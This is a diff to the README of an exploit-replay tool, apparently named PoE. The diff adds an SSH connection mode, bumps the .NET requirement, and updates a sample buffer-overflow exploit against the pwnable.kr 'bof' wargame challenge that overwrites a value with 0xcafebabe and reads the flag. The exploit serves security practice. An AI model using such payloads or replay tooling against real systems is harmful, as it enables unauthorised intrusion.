@@ -27,11 +27,11 @@ you can easily install the released version of PoE via .NET.
 
 ### Prerequisite
 
-+ [.NET 7+](https://dotnet.microsoft.com/en-us/download)
++ [.NET 9+](https://dotnet.microsoft.com/en-us/download)
 
 ### Instruction
 
-First, make sure you have installed .NET 7+ on your machine so that you can run
+First, make sure you have installed .NET 9+ on your machine so that you can run
 the command `dotnet` from your terminal.
 
 Next, just run the following command to install `PoE.Replayer`:
@@ -64,6 +64,12 @@ You can use either Local mode or Remote mode via the following commands:
 + Local mode: `poe stdin [replay options] <PoE> <bin path> [args]`
 + Remote mode: `poe net [replay options] <PoE> <ip> <port>`
 
+Also, we provide another way to connect to the remote service via SSH mode,
+where you can specify the username and password to log in to the remote host via
+SSH:
+
++ SSH mode: `poe ssh [replay options] <PoE> <ip> <port> <user> <password>`
+
 Running the PoE replayer without any parameters will show the other usages of
 PoE.
 
@@ -75,6 +81,7 @@ you can easily write its exploit via PoE:
 
 ```
 act exploit():
+    write("nc 0 9000\n")
     bv payload = "A"x(0x2c + 0x8) . 0xcafebabe:u32 . "\n"
     write(payload)
     write("cat flag\n")
@@ -87,7 +94,9 @@ submit:
 And then, you can run the following command to run the exploit on the remote
 service:
 ```
-poe net bof.poe pwnable.kr 9000
+poe ssh bof.poe pwnable.kr 9000 bof guest
 ```
+Note that you can also use Remote (`net`) mode when you connect to the remote
+service using the other ways (e.g. via `nc`).
 
 For more details, please see the [tutorial](tutorial).
